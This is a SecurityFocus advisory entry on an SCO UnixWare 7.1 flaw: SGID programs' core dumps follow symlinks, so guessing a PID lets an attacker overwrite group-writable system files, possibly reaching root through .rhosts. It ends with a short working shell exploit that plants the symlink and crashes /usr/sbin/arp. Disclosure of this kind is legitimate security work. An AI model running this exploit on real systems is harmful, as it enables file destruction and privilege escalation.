source: http://www.securityfocus.com/bid/851/info


Under certain versions of SCO UnixWare if a user can force a program with SGID (Set Group ID) to dump core they may launch a symlink attack by guessing the PID (Process ID) of the SGID process which they are calling. This is required because the coredump file will be dumped to the directory in which it is being executed from as './core.pid'. The program dumping core does not check for the existence of a symlinked file and will happily overwrite any file which it has permission to do so to. Many SGID binaries under Unixware are in the group 'sgid-sys' a group which has write permission to a large number of system critical files.

This attack will most likely result in a denial of service attack, however if the attacker can provide some provide data to the core file she may be able to leverage root access. For example is the intruder were able to get '+ +' into a line of it's own in the core file the intruder could then overwrite root's .rhosts file. 

#!/bin/sh
####
# Exploit for UnixWare 7.1 - sgid coredumps follow symlinks.
# Guessing pid is trivial. Any sgid program which will coredump can be used
# -Brock Tellier, btellier@usa.net
####
pid=`expr $$ + 4`;
ln -s /path/to/sys/group/writable/file core.$pid
/usr/sbin/arp `perl -e "print 'A' x 10000"`